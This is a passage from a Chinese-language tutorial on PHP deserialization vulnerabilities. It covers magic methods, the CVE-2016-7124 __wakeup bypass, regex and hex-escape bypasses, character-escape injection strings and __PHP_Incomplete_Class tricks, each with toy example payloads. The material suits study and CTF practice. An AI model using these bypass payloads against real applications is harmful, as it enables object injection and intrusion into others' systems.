class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__construct() //构造函数, 在对应对象实例化时自动被调用. #子类中的构    造函数不会隐式调用父类的构造函数.在 PHP 8 以前, 与类名同名      的方法可以作为 __constuct 调用但 __construct 方法优先</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__debugInfo() //在使用 var_dump, print_r 时会被调用</span><br><span class="line">__set_state()   // 调用var_export()导出类时，此静态方法会被调用</span><br><span class="line">__clone()       // 当对象复制完成时调用</span><br><span class="line">__autoload()    // 尝试加载未定义的类</span><br></pre></td></tr></table></figure></div><h3 id="反序列化绕过"><a class="markdownIt-Anchor" href="#反序列化绕过">#</a> 反序列化绕过</h3><h4 id="php71反序列化对类属性不敏感"><a class="markdownIt-Anchor" href="#php71反序列化对类属性不敏感">#</a> php7.1 + 反序列化对类属性不敏感</h4><p>我们前面说了如果变量前是 protected，序列化结果会在变量名前加上 <code>\x00*\x00</code></p><p>但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有 <code>\x00*\x00</code>  也依然会输出 <code>abc</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="绕过__wakeupcve-2016-7124"><a class="markdownIt-Anchor" href="#绕过__wakeupcve-2016-7124">#</a> 绕过__wakeup (CVE-2016-7124)</h4><p>版本：</p><blockquote><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p></blockquote><p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>如果执行 <code>unserialize('O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 <code>666</code></p><p>而把对象属性个数的值增大执行 <code>unserialize('O:4:&quot;test&quot;:2&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 abc</p><h4 id="绕过部分正则"><a class="markdownIt-Anchor" href="#绕过部分正则">#</a> 绕过部分正则</h4><p><code>preg_match('/^O:\d+/')</code>  匹配序列化字符串是否是对象字符串开头，这在曾经的 CTF 中也出过类似的考点</p><blockquote><p>・利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）<br>・serialize (array (a) ) ; // a));//a));//a 为要反序列化的对象 (序列化结果开 头是 a，不影响作为数组元素的 $a 的析构)</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="十六进制绕过字符匹配"><a class="markdownIt-Anchor" href="#十六进制绕过字符匹配">#</a> 十六进制绕过字符匹配</h4><p>可以使用十六进制搭配上已转义字符串来绕过对某些字符的检测</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name == <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You did it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t do it!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里检测了是否包含  <code>flag</code>  字符，我们可以尝试使用  <code>flag</code>  的十六进制  <code>\66\6c\61\67</code>  来绕过，构造以下:</p><p><code>'O:4:&quot;Read&quot;:1:&#123;s:4:&quot;name&quot;;S:4:&quot;\66\6c\61\67&quot;;&#125;'</code></p><p>可以用下面 python 脚本将字符串转化为 Hex</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&#x27;Enter a string: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\\&#x27;</span> + <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>(<span class="string">&#x27;\\&#x27;</span>))</span><br></pre></td></tr></table></figure></div><h4 id="利用引用"><a class="markdownIt-Anchor" href="#利用引用">#</a> 利用‘引用’</h4><p>对于需要判断两个变量是否相等时，我们可以考虑使用引用来让两个变量始终相等.</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure></div><p>上面这个例子将 <code>$b</code>  设置为 <code>$a</code>  的引用，可以使 <code>$a</code>  永远与 <code>$b</code>  相等</p><h4 id="php反序列化字符逃逸"><a class="markdownIt-Anchor" href="#php反序列化字符逃逸">#</a> php 反序列化字符逃逸</h4><h5 id="情况一过滤后字符过多"><a class="markdownIt-Anchor" href="#情况一过滤后字符过多">#</a> 情况一：过滤后字符过多</h5><p>例如以下情形：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure></div><p>正常情况，传入 <code>name=mao</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/394sFvRJkYWAglS.png" alt="image.png"></p><p>如果此时多传入一个 x 的话会怎样，毫无疑问反序列化失败，由于溢出 (s 本来是 4 结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/im4EPGFUnTDd52o.png" alt="image.png"></p><p>那我们传入 <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/Amz5WT7IJGrwKL3.png" alt="image.png"></p><p>传入 <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> <br> <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>  这一部分一共二十个字符<br>由于一个 x 会被替换为两个，我们输入了一共 20 个 x，现在是 40 个，多出来的 20 个 x 其实取代了我们的这二十个字符 <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> ，从而造成 <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>  的溢出，而 &quot; 闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出 <code>woaini</code> <br> 最后的；} 闭合反序列化全过程导致原来的 <code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>  被舍弃，不影响反序列化过程</p><h5 id="情况二过滤后字符变少"><a class="markdownIt-Anchor" href="#情况二过滤后字符变少">#</a> 情况二：过滤后字符变少</h5><p>例如：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br></pre></td></tr></table></figure></div><p>正常情况传入 <code>name=mao&amp;age=11</code>  的结果</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/S8lKoWxiAdyDfna.png" alt="image.png"></p><p>构造一下</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/wrXv7GNB41Amlug.png" alt="image.png"></p><p>简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；<br>我们来看，这部分是 age 序列化后的结果</p><p>s:3:“age”;s:28:“11”;s:3:“age”;s:6:“woaini”;}&quot;</p><p>由于前面是 40 个 x 所以导致少了 20 个字符，所以需要后面来补上， <code>&quot;;s:3:&quot;age&quot;;s:28:&quot;</code> 11 这一部分刚好 20 个，后面由于有&quot; 闭合了前面因此后面的参数就可以由我们自定义执行了</p><h4 id="利用不完整类绕过序列化回旋镖"><a class="markdownIt-Anchor" href="#利用不完整类绕过序列化回旋镖">#</a> 利用不完整类绕过序列化回旋镖</h4><p>当存在  <code>serialize(unserialize($x)) != $x</code>  这种很神奇的东西时，我们可以利用不完整类  <code>__PHP_Incomplete_Class</code>  来进行处理</p><p>当我们尝试反序列化到一个不存在的类是，PHP 会使用  <code>__PHP_Incomplete_Class_Name</code>  这个追加的字段来进行存储</p><p>我们于是可以尝试自己构造一个不完整类</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = <span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:1:&quot;F&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&#x27;O:1:&quot;F&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$raw</span>)) == <span class="variable">$exp</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><p>这样就可以绕过了</p><p>更近一步，我们可以通过这个让一个对象被调用后凭空消失，只需要手动构造无 <code>__PHP_Incomplete_Class_Name</code>  的不完整对象</p><h5 id="serialize-函数在处理__php_incomplete_class对象时所进行的特殊操作"><a class="markdownIt-Anchor" href="#serialize-函数在处理__php_incomplete_class对象时所进行的特殊操作">#</a> serialize () 函数在处理 <code>__PHP_Incomplete_Class</code>  对象时所进行的特殊操作</h5><p>unserialize () 在发现当前 PHP 上下文中没有包含相关类的类定义时将创建一个  <code>__PHP_Incomplete_Class</code>  对象。而 serialize () 在发现需要进行序列化的对象是  <code>__PHP_Incomplete_Class</code>  后，将对其进行 特殊处理 以得到描述实际对象而非  <code>__PHP_Incomplete_Class</code>  对象的序列化文本，而这里就包含了 将属性的描述值减一 这一步。<br>那么对象所属类的名称是否会发生替换，序列化文本中的  <code>__PHP_Incomplete_Class_Name</code>  是否会被自动删除以使得序列化文本中的属性个数描述值与实际相符呢？对此，请参考如下示例：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:3:&#123;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:7:&quot;MyClass&quot;;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;</span>)));</span><br></pre></td></tr></table></figure></div><p>执行结果</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">69</span>) <span class="string">&quot;O:7:&quot;</span>MyClass<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:8:&quot;</span>RedHeart<span class="string">&quot;;s:6:&quot;</span>nation<span class="string">&quot;;s:5:&quot;</span>China<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure></div><p>结合前面观察到的种种现象，我们可以总结出 serialize () 函数对 __PHP_Incomplete_Class 对象执行了如下 特殊操作（操作描述顺序并非 serialize 函数的实际操作顺序）：</p><p>将 <code> __PHP_Incomplete_Class</code>  对象中的 属性个数减一 并将其作为序列化文本中 对实际对象属性个数的描述值。<br>将  <code>__PHP_Incomplete_Class</code>  对象的 <code> __PHP_Incomplete_Class_Name</code>  作为序列化文本中 对象所属类的描述值。若未从  <code>__PHP_Incomplete_Class </code> 对象 中检查到  <code>__PHP_Incomplete_Class_Name</code>  属性，则跳过此步。<br>将  <code>__PHP_Incomplete_Class </code> 对象的序列化文本中对  <code>__PHP_Incomplete_Class_Name </code> 属性的描述删去。若没有发现相关描述，则跳过此步。</p><p>关于 <code>__PHP_Incomplete_Class</code>  更详细的介绍 &lt;<a class="link" href="https://blog.csdn.net/qq_44879989/article/details/133486308">PHP 反序列化漏洞：__PHP_Incomplete_Class 与 serialize (unserialize ($x)) !== $x <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>&gt;</p><h4 id="对象注入"><a class="markdownIt-Anchor" href="#对象注入">#</a> 对象注入</h4><p>当用户的请求在传给反序列化函数 <code>unserialize()</code>  之前没有被正确的过滤时就会产生漏洞。因为 PHP 允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 <code>unserialize</code>  函数，最终导致一个在该应用范围内的任意 PHP 对象注入。</p><p><strong>对象漏洞</strong>出现得满足两个前提</p><blockquote><p>1、 <code>unserialize</code>  的参数可控。<br>2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p></blockquote><p>比如：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;y4mao&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;maomi&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div><p>在脚本运行结束后便会调用 <code>_destruct</code>  函数，同时会覆盖 test 变量输出 <code>maomi</code></p><h3 id="pop"><a class="markdownIt-Anchor" href="#pop">#</a> POP</h3><h4 id="魔法函数"><a class="markdownIt-Anchor" href="#魔法函数">#</a> ———— 魔法函数 ———</h4><p>我需要再次提出魔法函数并且需要细致的解释供我更加深刻的理解</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__construct() //构造函数, 在对应对象实例化时自动被调用. #子类中的构造函数不会隐式调用父类的构造函数.在 PHP 8 以前, 与类名同名的方法可以作为 __constuct 调用但 __construct 方法优先</span><br><span class="line">__destruct() //对象被销毁时触发（对象不再被引用（unset），脚本执行结束）（当存在__destruct时，头一般是他）</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() 